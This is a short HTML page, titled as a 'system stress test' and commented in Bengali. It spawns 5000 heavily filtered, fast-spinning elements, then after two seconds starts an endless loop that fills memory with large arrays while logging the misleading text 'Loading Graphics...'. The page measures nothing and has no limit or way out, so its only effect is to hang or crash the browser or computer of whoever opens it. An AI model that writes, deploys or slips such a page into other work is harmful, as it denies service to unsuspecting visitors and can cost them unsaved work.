<!DOCTYPE html>
<html>
<head>
    <title>Extreme Load Test</title>
    <style>
        /* গ্রাফিক্সের ওপর প্রচণ্ড চাপ দেওয়ার জন্য CSS */
        .glitch {
            width: 50px; height: 50px;
            background: red;
            filter: blur(10px) contrast(500%);
            box-shadow: 0 0 50px blue;
            animation: rotate 0.1s infinite;
            display: inline-block;
        }
        @keyframes rotate { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>System Stress Testing...</h1>
    <div id="box"></div>

    <script>
        const box = document.getElementById('box');
        
        // ১. ৫০০০টি অ্যানিমেটেড এলিমেন্ট জেনারেট করা (GPU Stress)
        for (let i = 0; i < 5000; i++) {
            const div = document.createElement('div');
            div.className = 'glitch';
            box.appendChild(div);
        }

        // ২. মেমোরি এবং প্রসেসর জ্যাম করার ইনফিনিট লুপ (CPU Stress)
        function freeze() {
            let storage = [];
            while (true) {
                // র‍্যাম ভর্তি করার জন্য ডেটা পুশ করা
                storage.push(new Array(1000000).fill("HANG_TEST"));
                console.log("Loading Graphics...");
            }
        }

        // কিছু সময় পর প্রসেসটি শুরু হবে
        setTimeout(freeze, 2000);
    </script>
</body>
</html>
